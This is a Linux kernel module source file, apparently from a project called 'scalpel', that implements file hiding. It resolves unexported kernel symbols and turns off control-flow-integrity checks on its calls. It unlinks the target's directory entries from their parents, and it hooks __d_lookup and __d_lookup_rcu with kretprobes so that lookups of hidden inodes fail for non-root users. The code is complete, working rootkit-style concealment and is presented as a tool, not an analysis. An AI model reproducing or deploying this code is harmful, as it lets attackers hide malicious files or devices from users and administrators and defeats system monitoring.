/* SPDX-License-Identifier: GPL-2.0 */
/*
 * scalpel/hide/hide_inode.c
 *
 * Copyright (C) 2026 Kaidevon
 *
 */

#include "hide_inode.h"
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/fs.h>
#include <linux/dcache.h>
#include <linux/cred.h>
#include <linux/uidgid.h>
#include <linux/path.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/spinlock.h>
#include <linux/delay.h>
#include <linux/list.h>
#include <linux/version.h>
#include "ksym_get.h"

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 12, 0)
#define SCALPEL_DENTRY_UNLINK(d) hlist_del_init(&(d)->d_sib)
#define SCALPEL_DENTRY_EMPTY(d) hlist_unhashed(&(d)->d_sib)
#define SCALPEL_DENTRY_RELINK(d, p)                                            \
	hlist_add_head(&(d)->d_sib, &(p)->d_children)
#else
#define SCALPEL_DENTRY_UNLINK(d) list_del_init(&(d)->d_child)
#define SCALPEL_DENTRY_EMPTY(d) list_empty(&(d)->d_child)
#define SCALPEL_DENTRY_RELINK(d, p) list_add(&(d)->d_child, &(p)->d_subdirs)
#endif

typedef int (*kern_path_t)(const char *name, unsigned int flags,
			   struct path *path);
typedef void (*path_put_t)(const struct path *path);

static kern_path_t kern_path_fn;
static path_put_t path_put_fn;

__attribute__((no_sanitize("cfi"))) static int
call_kern_path(const char *name, unsigned int flags, struct path *path)
{
	return kern_path_fn(name, flags, path);
}

__attribute__((no_sanitize("cfi"))) static void
call_path_put(const struct path *path)
{
	path_put_fn(path);
}

struct hidden_dentry_node {
	struct list_head list;
	struct dentry *dentry;
	struct dentry *parent;
};

static struct hidden_inode hidden_list[MAX_HIDDEN_INODES];
static DEFINE_SPINLOCK(hidden_lock);

static LIST_HEAD(hidden_dentry_list);
static DEFINE_SPINLOCK(hidden_dentry_lock);

static int is_hidden(struct inode *inode)
{
	int i;
	unsigned long flags;

	if (!inode)
		return 0;

	spin_lock_irqsave(&hidden_lock, flags);
	for (i = 0; i < MAX_HIDDEN_INODES; i++) {
		if (hidden_list[i].valid &&
		    hidden_list[i].ino == inode->i_ino &&
		    hidden_list[i].dev == inode->i_sb->s_dev) {
			spin_unlock_irqrestore(&hidden_lock, flags);
			return 1;
		}
	}
	spin_unlock_irqrestore(&hidden_lock, flags);
	return 0;
}

static bool unlink_dentry_from_parent(struct dentry *dentry)
{
	struct hidden_dentry_node *node;
	struct dentry *parent = dentry->d_parent;

	if (!parent || parent == dentry)
		return false;

	node = kmalloc(sizeof(*node), GFP_KERNEL);
	if (!node)
		return false;

	dget(dentry);
	dget(parent);

	spin_lock(&parent->d_lock);
	SCALPEL_DENTRY_UNLINK(dentry);
	spin_unlock(&parent->d_lock);

	node->dentry = dentry;
	node->parent = parent;

	spin_lock(&hidden_dentry_lock);
	list_add(&node->list, &hidden_dentry_list);
	spin_unlock(&hidden_dentry_lock);

	pr_debug("hide_inode: unlinked dentry %p from parent %p\n", dentry,
		 parent);
	return true;
}

int hide_inode(struct inode *inode)
{
	int i, free = -1;
	unsigned long flags;
	unsigned long ino;
	dev_t dev;

	if (!inode)
		return -EINVAL;

	ino = inode->i_ino;
	dev = inode->i_sb->s_dev;

	spin_lock_irqsave(&hidden_lock, flags);
	for (i = 0; i < MAX_HIDDEN_INODES; i++) {
		if (hidden_list[i].valid) {
			if (hidden_list[i].ino == ino &&
			    hidden_list[i].dev == dev) {
				spin_unlock_irqrestore(&hidden_lock, flags);
				return 0;
			}
		} else if (free < 0) {
			free = i;
		}
	}
	if (free < 0) {
		spin_unlock_irqrestore(&hidden_lock, flags);
		return -ENOSPC;
	}
	hidden_list[free].ino = ino;
	hidden_list[free].dev = dev;
	hidden_list[free].valid = 1;
	spin_unlock_irqrestore(&hidden_lock, flags);

	/* Traverse dentry aliases (supports both hlist and list) */
#ifdef CONFIG_DCACHE_WORD_ACCESS
	{
		struct dentry *alias;
		struct hlist_node *n;

		rcu_read_lock();
		hlist_for_each_entry_safe (alias, n, &inode->i_dentry,
					   d_u.d_alias) {
			dget(alias);
			rcu_read_unlock();
			unlink_dentry_from_parent(alias);
			dput(alias);
			rcu_read_lock();
		}
		rcu_read_unlock();
	}
#else
	{
		struct dentry *alias;
		struct list_head *pos, *tmp;

		spin_lock(&inode->i_lock);
		list_for_each_safe (pos, tmp, &inode->i_dentry) {
			alias = list_entry(pos, struct dentry, d_alias);
			dget(alias);
			spin_unlock(&inode->i_lock);
			unlink_dentry_from_parent(alias);
			dput(alias);
			spin_lock(&inode->i_lock);
		}
		spin_unlock(&inode->i_lock);
	}
#endif

	return 0;
}

static void unhide_all(void)
{
	struct hidden_dentry_node *node, *tmp;
	LIST_HEAD(cleanup_list);

	spin_lock(&hidden_dentry_lock);
	list_for_each_entry_safe (node, tmp, &hidden_dentry_list, list)
		list_move_tail(&node->list, &cleanup_list);
	spin_unlock(&hidden_dentry_lock);

	list_for_each_entry_safe (node, tmp, &cleanup_list, list) {
		if (node->dentry && node->parent) {
			if (SCALPEL_DENTRY_EMPTY(node->dentry)) {
				spin_lock(&node->parent->d_lock);
				SCALPEL_DENTRY_RELINK(node->dentry,
						      node->parent);
				spin_unlock(&node->parent->d_lock);
			} else {
				pr_warn("hide_inode: dentry %p already linked\n",
					node->dentry);
			}
		}

		list_del_init(&node->list);
		if (node->dentry)
			dput(node->dentry);
		if (node->parent)
			dput(node->parent);
		kfree(node);
	}
}

static int dentry_ret_handler(struct kretprobe_instance *ri,
			      struct pt_regs *regs)
{
	struct dentry *d = (struct dentry *)regs_return_value(regs);

	if (IS_ERR_OR_NULL(d) || uid_eq(current_uid(), GLOBAL_ROOT_UID))
		return 0;
	if (d->d_inode && is_hidden(d->d_inode)) {
#ifdef CONFIG_ARM64
		regs->regs[0] = 0;
#else
		regs_set_return_value(regs, 0);
#endif
	}
	return 0;
}

static struct kretprobe kr_d_lookup = {
	.handler = dentry_ret_handler,
	.kp.symbol_name = "__d_lookup",
	.maxactive = 20,
};
static struct kretprobe kr_d_lookup_rcu = {
	.handler = dentry_ret_handler,
	.kp.symbol_name = "__d_lookup_rcu",
	.maxactive = 20,
};
static int kr_d_lookup_reg, kr_d_lookup_rcu_reg;

int init_hiding(const char *dev_path)
{
	int ret;
	struct path path;

	if (!kern_path_fn)
		kern_path_fn = (kern_path_t)ksym_get("kern_path");
	if (!path_put_fn)
		path_put_fn = (path_put_t)ksym_get("path_put");

	if (!kern_path_fn || !path_put_fn) {
		pr_err("hide_inode: failed to resolve required symbols\n");
		return -EINVAL;
	}

	ret = register_kretprobe(&kr_d_lookup);
	if (ret) {
		pr_err("hide_inode: __d_lookup kretprobe failed %d\n", ret);
		return ret;
	}
	kr_d_lookup_reg = 1;

	ret = register_kretprobe(&kr_d_lookup_rcu);
	if (ret) {
		pr_err("hide_inode: __d_lookup_rcu kretprobe failed %d\n", ret);
		goto err_unregister_first;
	}
	kr_d_lookup_rcu_reg = 1;

	if (dev_path) {
		ret = call_kern_path(dev_path, 0, &path);
		if (ret == 0) {
			if (path.dentry->d_inode) {
				ret = hide_inode(path.dentry->d_inode);
				if (ret && ret != -ENOSPC)
					pr_warn("hide_inode: failed to hide %s (ret=%d)\n",
						dev_path, ret);
			}
			call_path_put(&path);
		} else {
			pr_warn("hide_inode: %s not found, hiding incomplete (ret=%d)\n",
				dev_path, ret);
			ret = 0;
		}
	}

	pr_info("hide_inode: framework loaded%s%s\n", dev_path ? " for " : "",
		dev_path ?: "");
	return 0;

err_unregister_first:
	unregister_kretprobe(&kr_d_lookup);
	kr_d_lookup_reg = 0;
	return ret;
}

void exit_hiding(void)
{
	unsigned long flags;

	if (kr_d_lookup_rcu_reg)
		unregister_kretprobe(&kr_d_lookup_rcu);
	if (kr_d_lookup_reg)
		unregister_kretprobe(&kr_d_lookup);

	unhide_all();

	spin_lock_irqsave(&hidden_lock, flags);
	memset(hidden_list, 0, sizeof(hidden_list));
	spin_unlock_irqrestore(&hidden_lock, flags);

	pr_info("hide_inode: framework removed\n");
}